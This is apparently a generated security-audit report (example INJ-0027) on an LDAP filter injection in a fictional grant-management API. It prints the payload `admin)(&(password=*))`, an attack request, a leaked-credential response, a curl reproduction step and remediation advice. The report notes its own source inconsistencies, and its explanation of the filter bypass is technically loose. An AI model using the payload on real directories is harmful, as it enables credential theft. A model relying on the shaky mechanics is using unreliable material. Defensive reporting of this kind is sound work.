# Security Analysis Report
**System:** GrantFlow CRM API
**Domain:** Non-Profit / Grant Management
**Example ID:** INJ-0027
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | LDAP Injection | LDAP filter injection via `filter` parameter on `/api/v2/patients` — attacker injects `admin)(&(password=*))` to break LDAP filter logic and enumerate directory credentials |

---

## Finding 1 — LDAP Injection

### Summary
The `/api/v2/patients` endpoint on GrantFlow CRM API (`api.grantflow-crm-a.example.com`) constructs LDAP queries using raw string concatenation against a corporate directory service backend. Per §3.0, §4.0, and §2.0, the platform's directory service integration was not parameterized on this legacy endpoint. An attacker injects `admin)(&(password=*))` into the `filter` parameter — this closes the current LDAP filter's parenthesis, appends a conjunction (`&`) that is always true (any password matches `*`), and escapes the original filter scope, returning admin account data.

**Context.txt note:** §2.0 states the database is a "corporate directory services" (LDAP), but §3.0 vulnerable code snippet shows SQL-style syntax (`SELECT * FROM patients`). This is a context.txt inconsistency. Per §1.0, §2.0, and the vulnerability type (`LDAP Injection`), this analysis treats the backend as LDAP/directory services as stated. The SQL snippet in §3.0 appears to be a template artifact.

**Pattern:** LDAP Injection
**Affected endpoint:** `GET https://api.grantflow-crm-a.example.com/api/v2/patients`
**Vulnerable parameter:** `filter`

### Evidence from HAR (§5.0)

**Request — Attack**
```
GET https://api.grantflow-crm-a.example.com/api/v2/patients?filter=admin)(&(password=*))
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Accept: application/json
```

**Injected payload:** `filter=admin)(&(password=*))`

**Response — Directory Credentials Returned (LDAP filter bypassed)**
```json
{
  "data": [
    {"id": 1, "username": "admin", "password_hash": "$2b$12$secret", "role": "ADMIN"},
    {"id": 2, "username": "user2", "password_hash": "$2b$12$abc"}
  ]
}
```
Admin credentials disclosed: `username: admin`, `password_hash: $2b$12$secret`, `role: ADMIN`. LDAP filter injection confirmed — all directory user records returned.

**LDAP filter injection mechanics:**
- Original filter (constructed): `(filter=<input>)` → intended: `(filter=some_value)`
- Injected: `admin)(&(password=*))` → resulting filter: `(filter=admin)(&(password=*))` — the `&(password=*)` condition always evaluates true, returning all entries matching any password.

### Steps to Reproduce
```bash
curl -s -G "https://api.grantflow-crm-a.example.com/api/v2/patients" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Accept: application/json" \
  --data-urlencode 'filter=admin)(&(password=*))'
# Vulnerable: admin and user2 directory credentials returned
# Secure: {"data": [], "error": "Invalid filter parameter"}
```

### Remediation
1. Use LDAP parameterization libraries that escape special characters (`(`, `)`, `*`, `\`, `NUL`) in user input.
2. Validate and reject LDAP metacharacters in the `filter` parameter.
3. Remove over-privileged DB/directory account — use read-only, scoped directory bind DN.
4. Deploy WAF with LDAP injection detection rules on legacy endpoints.
